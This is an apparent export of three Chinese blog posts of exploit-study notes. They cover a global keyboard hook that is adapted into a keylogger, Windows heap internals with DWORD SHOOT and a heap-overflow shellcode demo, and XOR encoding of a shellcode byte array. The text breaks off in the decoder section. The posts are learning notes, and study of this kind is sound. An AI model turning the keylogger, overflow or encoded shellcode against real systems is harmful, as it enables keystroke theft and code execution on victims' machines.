[{"title":"windows消息hook","url":"/2021/07-05-windows消息hook/","content":"\n## 消息HOOK的原理\n\n![image-20210705162740753](windows消息hook.assets/image-20210705162740753.png)\n\n![hook1](windows消息hook.assets/hook1.png)\n\n## 消息钩子的实现\n\n通过`SetWindowsHookEx()`实现消息钩子，流程：\n\n```\n1、编写一个带有hook过程(KeyBoardProc)的DLL文件\n2、运行hookmain.exe文件，此时hookmain会最先加载这个dll，DLL中的方法SetWindowsHookEx会安装键盘钩子(应该是往所有的程序中安装)\n3、然后程序接收到键盘输入之后，就会判断是否是notepad.exe进程，如果是就拦截，如果不是，直接通过CallNextHookEx将消息传递给下一个hook\n\n注：在这个例子中，hook函数是写在了一个dll中，实际上也可直接使用exe进行hook\n```\n\nhookmain.exe代码：\n\n```c\n#include <iostream>\n#include <windows.h>\n#include <stdio.h>\n#include <conio.h>\n\n#define DEF_DLL_NAME \"KeyHook.dll\"\n#define DEF_HOOKSTART \"HookStart\"\n#define DEF_HOOKSTOP \"HookStop\"\n\ntypedef void(*PFN_HOOKSTART)();\ntypedef void(*PFN_HOOKSTOP)();\n\nint main()\n{\n    HMODULE hDll = NULL;\n    PFN_HOOKSTART HookStart = NULL;\n    PFN_HOOKSTOP HookStop = NULL;\n    char ch = 0;\n\n    // load Dll\n    hDll = LoadLibraryA(DEF_DLL_NAME);\n    if (hDll == NULL) {\n        printf(\"load fail \\n\");\n        return 0;\n    }\n    else {\n        printf(\"load success \\n\");\n    }\n\n    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\n    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);\n\n    HookStart();// 此时开始hook\n\n    printf(\"press 'q' to quit!\\n\");\n\n    // if user push 'q' key, HookStop\n    while (1) {\n        if (_getch() == 'q') {\n            break;\n        }\n        printf(\"Test Typing  \\n\");\n    }\n\n    HookStop();\n\n    FreeLibrary(hDll);\n    return 0;\n}\n```\n\nKeyHook.dll文件的代码：\n\n```c++\n#include \"stdio.h\"\n#include \"windows.h\"\n\n#define DEF_PROCESS_NAME \"notepad.exe\"\n\nHINSTANCE g_hInstance = NULL;\nHHOOK g_hHook = NULL;\nHWND g_hWnd = NULL;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n{\n\tswitch (dwReason)\n\t{\n\tcase DLL_PROCESS_ATTACH:\n\t\tg_hInstance = hinstDLL;\n\t\tbreak;\n\tcase DLL_PROCESS_DETACH:\n\t\tbreak;\n\t}\n\treturn true;\n}\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)\n{\n\tchar szPath[MAX_PATH] = {0,};\n\tchar *p = NULL;\n\tif (nCode >= 0)\n\t{\n\t\tif (!(lParam & 0x80000000))//释放键盘按键时\n\t\t{\n\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\n\t\t\tp = strrchr(szPath, '\\\\');\n\t\t\t//比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或下一个“钩子”）\n\t\t\tif (!_stricmp(p + 1, DEF_PROCESS_NAME))\n\t\t\t\treturn 1;\n\t\t}\n\t}\n\t//若非notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序\n\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n}\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif // __cplusplus\n\t__declspec(dllexport) void HookStart()\t// 开始hook\n\t{\n\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\n\t}\n\t__declspec(dllexport) void HookStop()\t// 停止hook\n\t{\n\t\tif (g_hHook)\n\t\t{\n\t\t\tUnhookWindowsHookEx(g_hHook);\n\t\t\tg_hHook = NULL;\n\t\t}\n\t}\n#ifdef __cplusplus\n}\n#endif\n\n```\n\n运行hookmain.exe之后，打开notepad.exe输入字符发现被拦截\n\n![image-20210705122030784](windows消息hook.assets/image-20210705122030784.png)\n\n这里DLL中的KeyboardProc作为回调函数，供SetWindowsHookEx调用，算是微软官方提供的一种调用方式：\n\nhttps://docs.microsoft.com/en-us/windows/win32/winmsg/keyboardproc\n\nhttps://segmentfault.com/a/1190000008293902\n\n通过procexp查看，可以看到哪些进程加载了这个dll\n\n![image-20210705122117331](windows消息hook.assets/image-20210705122117331.png)\n\n这里安装了hook程序之后，每个程序接收键盘输入的时候，都会经过这个hook代码，这里新建一个RTF文档，再通过Procexp可以看到，wordpad.exe进程中也加载了keyhook.dll文件\n\n![image-20210705170012077](windows消息hook.assets/image-20210705170012077.png)\n\n## HookMain的调试\n\n直接使用OD打开：\n\n![image-20210705140541108](windows消息hook.assets/image-20210705140541108.png)\n\n![image-20210705140559044](windows消息hook.assets/image-20210705140559044.png)\n\n文章中说到，逐行一般是程序无法正常运行时的策略，所以这里直接检索相关字符串，前面打开之后可以看到\n\n![image-20210705140653200](windows消息hook.assets/image-20210705140653200.png)\n\n直接看到所有的明文字符串，然后双击即可跳转到字符串所在位置\n\n![image-20210705141456273](windows消息hook.assets/image-20210705141456273.png)\n\n![image-20210705141543715](windows消息hook.assets/image-20210705141543715.png)\n\n这里往上翻，可以看到加载dll，以及读dll中方法地址的函数，直接F8单步执行，在执行到004012F7的时候可以看到KeyHook.HookStart文字显示：\n\n![image-20210705143933114](windows消息hook.assets/image-20210705143933114.png)\n\n也就是说调用了HookStart方法，这里F7单步跟入：\n\n![image-20210705145238298](windows消息hook.assets/image-20210705145238298.png)\n\n再次F7：\n\n![image-20210705145310923](windows消息hook.assets/image-20210705145310923.png)\n\n可以看到这里调用`SetWindowsHookEXA`的代码，先push三个参数，然后直接CALL指令调用\n\n这里push的第一个参数是2，第二个参数其实就是钩子过程`KeyboardProc`的地址：`push KeyHook.10001014`\n\n## 调试Notepad.exe进程内的KeyHook.dll\n\n上面是直接调试的HookMain.exe，这里直接调试Notepad.exe进程中的KeyHook.dll，先将notepad.exe用OD打开，然后设置下面的调试选项，意思是每次有新的dll加载时就中断：\n\n![image-20210705154347322](windows消息hook.assets/image-20210705154347322.png)\n\n![image-20210705154324434](windows消息hook.assets/image-20210705154324434.png)\n\n![image-20210705154421698](windows消息hook.assets/image-20210705154421698.png)\n\n这里原版的OD没有办法查看到，所以使用了吾爱破解版本中文版本的重新加载，即可看到keyhook.dll被加载\n\n![image-20210705155128313](windows消息hook.assets/image-20210705155128313.png)\n\n直接双击即可进入EP地址：\n\n![image-20210705155948788](windows消息hook.assets/image-20210705155948788.png)\n\n然后根据调试HookMain中得到的地址可以知道10001014这里就是调用钩子过程`KeyboardProc`的地址，双击，即可看到函数的实际地址是：\n\n![image-20210705160525679](windows消息hook.assets/image-20210705160525679.png)\n\n直接`Ctrl+G`跳转到`10001080`，这里就是函数真正开始的位置，这里比书中多了一步，就是上面的`10001014`地址还需要多一次跳转\n\n![image-20210705160953421](windows消息hook.assets/image-20210705160953421.png)\n\n进入之后F2设置断点，每次在notepad.exe中输入字符的时候就都可以触发这个断点，整体的流程为：\n\n![image-20210705161113607](windows消息hook.assets/image-20210705161113607.png)\n\n## 键盘记录的功能改造\n\n拦截之后直接通过OutputDebugString方法，输出到debug，main函数不变\n\n```c\n// dllmain.cpp : 定义 DLL 应用程序的入口点。\n#include \"pch.h\"\n#include <iostream>\n#include <vector>\n\n#define DllExport __declspec(dllexport)\n#define DEF_PROCESS_NAME L\"notepad.exe\"\n\nusing namespace std;\n\nHMODULE myModule = NULL;\nHHOOK myHook = NULL;\nint pos = 0;\nvector<WCHAR> result;\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        myModule = hModule;\n        break;\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\nLRESULT CALLBACK KeyboardProc(\n    _In_ int    code,\n    _In_ WPARAM wParam,\n    _In_ LPARAM lParam\n) {\n    WCHAR szPath[MAX_PATH] = { 0 };\n    WCHAR* path = NULL;\n    if (code == 0)// \n    {\n        GetModuleFileName(NULL, szPath, MAX_PATH);  // 获取当前进程的PE文件路径\n        path = wcsrchr(szPath, '\\\\'); // 从一个字符串中寻找某个字符最后出现的位置。\n\n        WCHAR reee = (WCHAR)wParam;\n\n        if (!_wcsicmp(path + 1, DEF_PROCESS_NAME)|| wParam >= 0x30 && wParam <= 0x39 || wParam >= 0x41 && wParam <= 0x5A)\n        {\n            OutputDebugString(path + 1);//输出进程文件名\n            result.push_back((WCHAR)wParam);\n            OutputDebugString(&reee);\n        }\n\n    }\n    return CallNextHookEx(myHook, code, wParam, lParam);\n}\n\nextern \"C\" {\n    DllExport void HookStart() {\n        myHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, myModule, 0);\n    }\n\n    DllExport void HookStop() {\n        UnhookWindowsHookEx(myHook);\n        myHook = NULL;\n    }\n}\n```\n\n![image-20210707102748749](windows消息hook.assets/image-20210707102748749.png)\n\n这里是参考看雪的代码改的，原本的地址在：\n\nhttps://bbs.pediy.com/thread-261399.htm","categories":["二进制相关"]},{"title":"0Day_5_堆溢出利用","url":"/2021/06-10-0Day_5_堆溢出利用/","content":"# 堆的工作原理\n\n## 堆的特性\n\n```\n1、堆是一种再程序运行时动态分配的内存。\n2、堆在使用时需要程序员用专用函数进行申请。\n3、一般用一个堆指针来使用申请得到的内存，读、写、释放都通过这个指针来完成。\n问题：如果是一个指针又是链表，指针肯定要变化的，如何一直指向空白处？\n4、使用完毕后，需要把堆指针传给堆释放函数回收这片内存，否则会造成内存泄漏，典型的释放函数包括free、delete等。\n```\n\n## 堆的数据结构\n\n程序使用堆时做的三件事情：\n\n```\n申请一定大小的内存\n使用内存\n释放内存\n```\n\n堆的数据结构，分为两类：\n\n```\n堆块\n堆表\n```\n\n参考下图：\n\n![未命名文件](0Day_5_堆溢出利用.assets/未命名文件.png)\n\n### 空表\n\n空表是由空闲堆块组成的双向链表，按照堆块的大小不同，一共有128条\n\n![image-20210619104027844](0Day_5_堆溢出利用.assets/image-20210619104027844.png)\n\n链表大小规定：\n\n```\nfree[0]中都是>= 1024字节的\nfree[1]中都是8字节的\nfree[2]中都是16字节的\nfree[3]中都是24字节的\n以此类推，数组每增加一个就堆块的大小就增加8个字节\n```\n\n### 快表\n\n快表就是快速单项链表，也就是说堆块按照单链表组织\n\n每条快表最多只有4个节点：\n\n![image-20210619104425679](0Day_5_堆溢出利用.assets/image-20210619104425679.png)\n\n也是依次按照大小排列\n\n## 堆的分配策略\n\n快表只有在精确匹配时才会被分配，就是申请的字节数正好和单链表中的现有的区块大小相同，比如申请的是8字节的、16字节的等等\n\n快表被分配时，流程为：\n\n```\n寻找到大小匹配的空闲堆块\n----->\n将其状态修改为占用态\n----->\n把堆块从堆表中卸下\n----->\n返回一个指向堆块块身的指针给程序\n```\n\n普通空表分配分为几个场景：\n\n```\n1、普通空表分配时首先寻找最优的空闲块分配，如果失败，则寻找次优的空闲块分配(即最小的能够满足要求的空闲块)\n2、零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一个块，看是否能满足，如果能，再正想搜索最小的能够满足要求的空闲堆块进行分配\n3、找零钱现象：无法找到匹配的最优堆块时，一个稍大一些的堆块会被用于分配，按照请求的大小割出一块进行分配，剩下的部分重新标注块首，链入空表\n```\n\n## 堆块释放\n\n```\n释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也先从堆表末尾拿。\n```\n\n## 堆块合并\n\n![image-20210619105723515](0Day_5_堆溢出利用.assets/image-20210619105723515.png)\n\n这里还提到了内存紧缩的一个概念：\n\n![image-20210619105805604](0Day_5_堆溢出利用.assets/image-20210619105805604.png)\n\n实际上也就是堆块合并的一种。\n\n堆块分配和释放也会受到大小的影响，windows按照大小分为三种：\n\n```\n小块 size < 1KB\n大块 1KB < size < 512KB\n巨块 size > 512KB\n```\n\n按照大小对应的分配和释放策略参照下表：\n\n![image-20210619110559931](0Day_5_堆溢出利用.assets/image-20210619110559931.png)\n\nWindows堆管理的几个要点：\n\n![image-20210619111418957](0Day_5_堆溢出利用.assets/image-20210619111418957.png)\n\n# 在堆中漫游\n\n## 堆分配函数之间的调用关系\n\n![image-20210619111621567](0Day_5_堆溢出利用.assets/image-20210619111621567.png)\n\n这里说到了堆的管理架构和堆分配最底层的调用函数\n\n## 堆的调试方法\n\n首先创建一个简单的程序，通过这个程序创建一个堆，然后使用堆分配函数从这个堆中分配内存：\n\n```c++\n#include <windows.h>\n\nmain()\n{\n\tHLOCAL h1,h2,h3,h4,h5,h6;\n\tHANDLE hp;\n    // \n\thp= HeapCreate(0,0x1000,0x10000);\n    printf(\"hp: %x\",hp);\n\t__asm int 3\n\t\n    //\n\th1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3);\n\th2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5);\n\th3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,6);\n\th4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,19);\n\th6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24);\n\n\tHeapFree(hp,0,h1);\n\tHeapFree(hp,0,h3);\n\tHeapFree(hp,0,h5);\n\tHeapFree(hp,0,h4);\n\n\treturn 0;\n}\n```\n\nheapcreate创建一个只有调用进程才能访问的私有堆\n\n```c\nHANDLE HeapCreate(\n  DWORD  flOptions,// 堆分配选项\n  SIZE_T dwInitialSize,// 堆的初始大小\n  SIZE_T dwMaximumSize// 堆的最大大小\n);\n```\n\n关于dwMaximumSized的详解：\n\n```\n使用场景：\n\t如果函数 HeapAlloc 和 HeapReAlloc 要求分配的空间超过参数 dwInitialSize 指定的大小，系统会分配额外的空间给该堆直到这个堆的最大大小(dwMaximumSize)。\n\n参数含义：\n\tdwMaximumSize != 0：\n\t堆的大小固定，不能超过最大大小，此外，可以从堆分配的最大内存块对于 32 位进程略小于 512 KB，对于 64 位进程略小于 1,024 KB。即使堆的最大大小足以容纳该块，分配更大块的请求也会失败。\n\n\tdwMaximumSize = 0：\n\t那么该堆大小的唯一限制是可用的内存空间，并且通过HeapAlloc能分配的内存空间大小不受固定限制，系统会通过调用 VirtualAlloc分配足够大小的内存。\n\n此外，实际申请内存时，最终申请的内存总和并不一定能达到设定的 最大值dwMaxmumSize\n```\n\nHeapAlloc在指定的堆上分配内存\n\n```C\nDECLSPEC_ALLOCATOR LPVOID HeapAlloc(\n  HANDLE hHeap,\t//堆句柄\n  DWORD  dwFlags,// 分配选项，下面的HEAP_ZERO_MEMORY表示分配的内存会被初始化为0\n  SIZE_T dwBytes// 要分配的字节数\n);\n```\n\n详情：https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc\n\n这里编译成Release版本之后将Ollydbg设置为默认调试程序：\n\n![image-20210617225604283](0Day_5_堆溢出利用.assets/image-20210617225604283.png)\n\n上面是在XP执行的，由于执行程序之后担心堆的分配不一样，所以换成了windows2000，这里可以看到创建的堆(句柄为hp)的地址是360000，大小为1000：\n\n![image-20210619002717429](0Day_5_堆溢出利用.assets/image-20210619002717429.png)\n\n这里进程中主要关注三个堆\n\n```\n1、起始地址为0x00130000，大小为0x6000的堆，可以通过`GetProcessHeap()`获得这个堆的句柄并使用，起始地址是0x00130000是因为在windows2000中，堆的内存起始地址在一般时候为0x00130000\n\n2、起始地址为0x00340000,大小为0x5000的堆，是属于分配函数malloc()的堆区\n\n3、起始地址为0x00360000,大小为0x1000的堆，为heapcreate创建的\n```\n\n参考：https://jingyan.baidu.com/article/425e69e68a0df4be15fc1615.html\n\n这里的Type有Priv、Map、Imag三种\n\n```\npriv是private，即本进程私有内存区域，一般是进程的堆和栈。以及HeapAlloc和VirtualAlloc申请的内存块。\n\nimg是image，即本块内存是映像文件加载进来的，就是exe、dll被装载到的地方。\n\nmap是mapping，是被映射进来的文件的内存块，即createfilemapping函数相关的。\n```\n\n## 识别堆表\n\n### 堆区的结构\n\n上面申请的堆区的返回值为0x00360000，也就是说申请的堆是从这个位置开始，包含的信息依次为：\n\n```\n段表索引\n虚表索引\n空表使用标识\n```\n\n从0x178位置开始是`空表索引区`，因为是双向链表，所以Freelist的一个元素占8个字节，两个指针\n\n```\n1、初始化之后，这里只有一个空闲态的大块，被称为尾块\n2、尾块的位置为图中红线标注的00360688，也就是在偏移0x688的位置\n3、其他的索引数组元素当前都指向自身的地址，意味着其余的空闲列表都没有空闲块\n```\n\n![image-20210619120308156](0Day_5_堆溢出利用.assets/image-20210619120308156.png)\n\n### 堆块的结构\n\n空闲态堆块和占用态堆块的块首的说明：\n\n```\n占用态 块首占8个字节，内容如下图\n```\n\n![image-20210619121812652](0Day_5_堆溢出利用.assets/image-20210619121812652.png)\n\n```\n空闲态 块首实际是16个字节，在占用态块首的基础上多出来8个字节保存空表的地址\n```\n\n![image-20210619122429486](0Day_5_堆溢出利用.assets/image-20210619122429486.png)\n\n堆块块首的结构为，注意这里`Self Size`不是表示堆块大小的字节数，分配粒度为8个字节，参考下图（来自`《软件调试》`）：\n\n![image-20210619181400812](0Day_5_堆溢出利用.assets/image-20210619181400812.png)\n\n这个堆块的地址实际是00360680，但是空表索引里的指针会直接越过块首\n\n```\n00360680开头的8个字节，就是空闲块的块首\n00360688开头的8个字节，保存了空表索引的指针\n```\n\n![image-20210619121648400](0Day_5_堆溢出利用.assets/image-20210619121648400.png)\n\n这里根据上图红圈可以看到，这个块的`Self size`为0x130，堆块长度为0x8，结果两者相乘为0x980\n\n`Previous chunk size`表示上一个堆块的大小，和自身大小没有关系，这里只是碰巧也为0x8\n\n这里有个注意事项，主要是要记住，想要创建可扩展的堆需要使用heapCreate(0,0,0)：\n\n![image-20210619181805041](0Day_5_堆溢出利用.assets/image-20210619181805041.png)\n\n## 堆块的分配\n\n堆块的分配策略：\n\n![image-20210619183209438](0Day_5_堆溢出利用.assets/image-20210619183209438.png)\n\n对于程序中的6次堆块分配结果为：\n\n![image-20210619183232183](0Day_5_堆溢出利用.assets/image-20210619183232183.png)\n\n单步执行到6个堆块分配完毕，查看堆的情况如下所示，使用红框框出来的是6个堆块的块首：\n\n![image-20210619183052930](0Day_5_堆溢出利用.assets/image-20210619183052930.png)\n\n其中最下面一块尾块的大小由0x130变为了0x120，因为上面六次分配一共分配了0x10个单位的空间\n\n![image-20210619184014825](0Day_5_堆溢出利用.assets/image-20210619184014825.png)\n\n空表索引已经指向了新的尾块地址`0x00360708`\n\n### 堆块的释放\n\n![image-20210619185040643](0Day_5_堆溢出利用.assets/image-20210619185040643.png)\n\n堆块被释放之后，根据大小链入相应的freelist，三次执行完之后，可以看到，在空表索引处，也就是下面的三个红框，分别指向：\n\n```\nfreelist[0]\t指向尾块\nfreelist[0]\t指向h1和h3释放的堆块,因为h1和h3的大小相同\nfreelist[0]\t指向h5释放的堆块\n```\n\n![image-20210619185025867](0Day_5_堆溢出利用.assets/image-20210619185025867.png)\n\n此时堆块的内容为：\n\n![image-20210619185636719](0Day_5_堆溢出利用.assets/image-20210619185636719.png)\n\n可以看到，h1、h3、h5的块身的内容已经变为空表索引的地址，其他的块身的内容仍然为00填充\n\n## 堆块的合并\n\n在执行最后一步`HeapFree(hp,0,h4)`之后，由于h4和h3大小相同，所以会合并为一个4单位的堆块，然后再和h5合并为一个8单位的堆块，被链入`freelist[8]`\n\n![image-20210619190334642](0Day_5_堆溢出利用.assets/image-20210619190334642.png)\n\n上图可见，原本`0x003606A0`处的大小为2，现在变为了8，并且`0x003606A8`处指向`freelist[8]`的位置\n\n# 堆溢出利用(上)-DWORD SHOOT\n\ndword shoot是说能够向任意内存写入任意数据的一个情况，主要是通过向堆中写入数据然后溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)\n\n## 链表\"拆卸\"中的问题\n\n卸下链表的操作类似下面的代码：\n\n```c\nint remove(ListNode * node)\n{\n\tnode -> blink -> flink = node -> flink;\n\tnode -> flink -> bink = node -> blink;\n\treturn 0;\n}\n```\n\n## 在调试中体会DWORD SHOOT\n\n代码和上一节的类似，稍作修改：\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nmain()\n{\n\tHLOCAL h1,h2,h3,h4,h5,h6;\n\tHANDLE hp;\n    // \n\thp= HeapCreate(0,0x1000,0x10000);\n\tprintf(\"hp: %x\",hp);\n\n\t\n    //\n\th1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\th6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\n\t__asm int 3\n\t\n\tHeapFree(hp,0,h1);\n\tHeapFree(hp,0,h3);\n\tHeapFree(hp,0,h5);\n\n\th1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n\n\treturn 0;\n}\n```\n\n然后依然默认使用ollydbg直接运行，会在`__asm int 3`处中断，直接F8执行到三次HeapFree之后，查看堆区的内容：\n\n![image-20210620210624495](0Day_5_堆溢出利用.assets/image-20210620210624495.png)\n\nh1、h3、h5在释放之后都会被链入freelist[2]，因为加上块首都是16字节\n\n最后`h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);`这里，会将h5的堆块分配出去，也就是说，执行完毕之后h1指向的是h5\n\n这里直接将h5堆块的flink和blink修改为`0x44444444`和`0x00000000`，之后继续执行最后一个HeapAlloc会直接报错\n\n![image-20210620213130730](0Day_5_堆溢出利用.assets/image-20210620213130730.png)\n\nECX被修改\n\n![image-20210620213218762](0Day_5_堆溢出利用.assets/image-20210620213218762.png)\n\n# 堆溢出利用(下)-代码植入\n\n\n\n```c\n#include <windows.h>\n\nchar shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\";\n\nmain()\n{\n    HLOCAL h1 = 0, h2 = 0;\n    HANDLE hp;\n    hp = HeapCreate(0,0x1000,0x10000);\n    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);\n    \n    __asm int 3\n    memcpy(h1,shellcode,0x200);\n    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);\n    return 0;\n}\n```\n\n"},{"title":"0day漏洞挖掘_3.5_构造一个反弹shell的shellcode","url":"/2021/06-03-0day漏洞挖掘_3.5_构造一个反弹shell的shellcode/","content":"\n# 加密shellcode\n\n书中的这里使用的异或加密，即先加密，然后再解密，完整代码为：\n\n```c++\n// 03_xor_shellcode.cpp : Defines the entry point for the console application.\n//\n\n#include \"stdafx.h\"\n#include <string.h>\n#include <stdlib.h>\n\nchar shellcode[] = { 0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C, 0x89, 0xE6, 0x8D, 0x7E, 0xF4, 0x31, 0xDB, 0xB7, 0x04, 0x29, 0xDC, 0x66, 0xBB, 0x33, 0x32, 0x53, 0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x31, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B, 0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0x05, 0x95, 0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x05, 0x78, 0x01, 0xE9, 0x8B, 0x59, 0x20, 0x01, 0xEB, 0x31, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x01, 0xEE, 0x99, 0x0F, 0xBE, 0x06, 0x38, 0xE0, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x01, 0xC2, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24, 0x1C, 0x75, 0xE4, 0x8B, 0x59, 0x24, 0x01, 0xEB, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x01, 0xEB, 0x03, 0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9, 0x31, 0xDB, 0x53, 0x68, 0x77, 0x65, 0x73, 0x74, 0x68, 0x66, 0x61, 0x69, 0x6C, 0x89, 0xE0, 0x53, 0x50, 0x50, 0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8, 0x90, 0x90, 0x90, 0x90 };\n\nvoid encoder(char* input ,unsigned char key,int display_flag)\n{\n    int i = 0,len = 0;\n    FILE * fp;\n    unsigned char* output;\n    len = strlen(input);\n    output = (unsigned char *)malloc(len+1);\n    if(!output)\n    {\n        printf(\"memory erro!\\n\");\n        exit(0);\n    }\n\t// 循环异或\n    for(i=0;i<len;i++)\n    {\n        output[i]=input[i]^key;\n    }\n\n    if(!(fp=fopen(\"encode.txt\",\"w+\")))\n    {\n        printf(\"output file create erro\");\n        exit(0);\n    }\n\n    fprintf(fp,\"\\\"\");\n    for(i=0;i<len;i++)\n    {\n        fprintf(fp,\"\\\\x%0.2x\",output[i]);\n        if((i+1)%16==0)\n        {\n            fprintf(fp,\"\\\"\\n\\\"\");\n        }\n    }\n    fprintf(fp,\"\\\";\");\n    fclose(fp);\n    printf(\"dump the encoded shellcode to encode.txt OK!\\n\");\n    if(display_flag)\n    {\n        for(i=0;i<len;i++)\n        {\n            printf(\"%0.2x \",output[i]);\n            if((i+1)%16==0)\n            {\n                printf(\"\\n\");\n            }\n        }\n    }\n    free(output);\n}\n\n\nint main(int argc, char* argv[])\n{\n\tprintf(\"Hello World!\\n\");\n\tencoder(shellcode,0x44,1);\n\treturn 0;\n}\n```\n\n这里主要的代码就是异或的那一行：\n\n```\noutput[i]=input[i]^key;\n```\n\n可以到网上在线异或运算的计算一下结果是否一样：https://www.23bei.com/tool-531.html\n\n结果为：\n\n![image-20210603110023620](0day漏洞挖掘_3.5_构造一个反弹shell的shellcode.assets/image-20210603110023620.png)\n\nshellcode为：\n\n```\n\"\\xb8\\x2c\\x2e\\x4e\\x7c\\x5a\\x2c\\x27\\xcd\\x95\\x0b\\x2c\\x76\\x30\\xd5\\x48\"\n\"\\xcd\\xa2\\xc9\\x3a\\xb0\\x75\\x9f\\xf3\\x40\\x6d\\x98\\x22\\xff\\x77\\x76\\x17\"\n\"\\x2c\\x31\\x37\\x21\\x36\\x10\\x75\\x96\\x20\\xcf\\x1e\\x74\\xcf\\x0f\\x48\\xcf\"\n\"\\x0d\\x58\\xcf\\x4d\\xcf\\x2d\\x4c\\xe9\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\x41\\xd1\"\n\"\\xbb\\x13\\xbc\\xd1\\x24\\xcf\\x01\\x78\\xcf\\x08\\x41\\x3c\\x45\\xad\\xcf\\x1d\"\n\"\\x64\\x45\\xaf\\x75\\xbb\\x03\\xcf\\x70\\xff\\x45\\xaa\\xdd\\x4b\\xfa\\x42\\x7c\"\n\"\\xa4\\x30\\x4c\\x85\\x8e\\x43\\x45\\x86\\x02\\xaf\\xb5\\x7f\\x10\\x60\\x58\\x31\"\n\"\\xa0\\xcf\\x1d\\x60\\x45\\xaf\\x22\\xcf\\x78\\x3f\\xcf\\x1d\\x58\\x45\\xaf\\x47\"\n\"\\x68\\xff\\xd1\\x1b\\xef\\x13\\x25\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\xed\\x75\\x9f\"\n\"\\x17\\x2c\\x33\\x21\\x37\\x30\\x2c\\x22\\x25\\x2d\\x28\\xcd\\xa4\\x17\\x14\\x14\"\n\"\\x17\\xbb\\x13\\xb8\\x17\\xbb\\x13\\xbc\\xd4\\xd4\\xd4\\xd4\";\n```\n\n然后可以使用下面的汇编代码进行解码：\n\n```c++\nvoid main()\n{\n    __asm\n    {\n        add eax,0x14\n        